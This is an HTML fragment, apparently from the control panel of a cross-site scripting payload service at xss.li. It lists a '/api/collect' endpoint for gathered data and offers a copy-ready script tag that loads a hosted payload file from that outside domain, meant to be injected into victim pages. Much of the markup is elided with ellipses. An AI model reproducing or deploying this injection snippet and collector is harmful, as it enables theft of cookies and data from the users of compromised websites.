        ...
        <div class="container-fluid">
                        ...
                        <div class="col-md-6">
                            ...
                            <div class="mb-3">
                                ...
                                <div class="input-group input-group-sm">
                                    <input type="text" class="form-control" value="https://xss.li/" readonly onclick="this.select()">
                            ...
                            <div class="mb-3">
                                ...
                                <div class="input-group input-group-sm">
                                    <input type="text" class="form-control" value="https://xss.li/api/collect" readonly onclick="this.select()">
                                    <button class="btn btn-outline-secondary" onclick="this.previousElementSibling.select(); document.execCommand('copy'); alert('已复制');"><i class="fas fa-copy"></i></button>
                                </div>
                            </div>
                        </div>
            ...
            <div class="card shadow fade-in">
                ...
                <div class="card-body">
                    ...
                    <pre class="bg-dark p-3 rounded"><code>&lt;script src="https://xss.li/payloads/your_file.js"&gt;&lt;/script&gt;</code></pre>
